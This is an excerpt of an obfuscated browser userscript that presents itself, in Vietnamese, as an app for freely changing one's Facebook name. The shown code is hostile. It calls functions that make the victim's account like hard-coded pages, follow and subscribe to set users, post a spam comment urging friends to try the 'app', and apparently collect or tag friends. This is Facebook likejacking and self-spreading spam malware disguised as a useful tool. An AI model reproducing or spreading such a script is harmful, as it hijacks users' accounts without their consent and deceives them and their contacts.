// ==UserScript==
// @name            NEW ỨNG DỤNG ĐỔI TÊN FB THOẢI MÁI
// @description     All about facebook By SHG
...
(function () {
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/pages/Cu%E1%BB%99c-S%E1%BB%91ng-Mu%C3%B4n-M%C3%A0u/256944201144247" target="_blank">Tool Chibi Làm 5 LẦN MỚI ĐƯỢC</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
Like("1477763059109729");
Like("1414803292104238");
Like("513972428673858");
Like("256944201144247");
Like("1439861352918908");
//Minh Quê 
a("100004194280695");
sublist("219275544888920");
sublist("229767727173035");
Like("167035276821224");
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= (y) Ứng dụng này hay thật đó <3 . Các Bạn Thử Đi 󾌫 󾌫 . Rất cảm ơn bạn 󾬔  󾬕  󾬖  󾀀  󾀀  󾀀  󾔗  󾔗  󾔗  󾀄  󾀄  󾌧  󾌧  󾇗  󾇗  󾌶  󾌶  󾠚  󾠚  󾓲  󾓲  󾀽  󾀽  󾆔  󾆔  󾆔  󾆼  󾆼  󾔐  󾔐 󾇕 󾇕 󾇇 󾇇 󾭩 󾭩 󾬍 󾬍 󾬐 󾬐 󾬐 󾆓 󾆓 󾥠 󾥠 󾥠  ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(262340770604590);arkadaslari_al(695053817203077);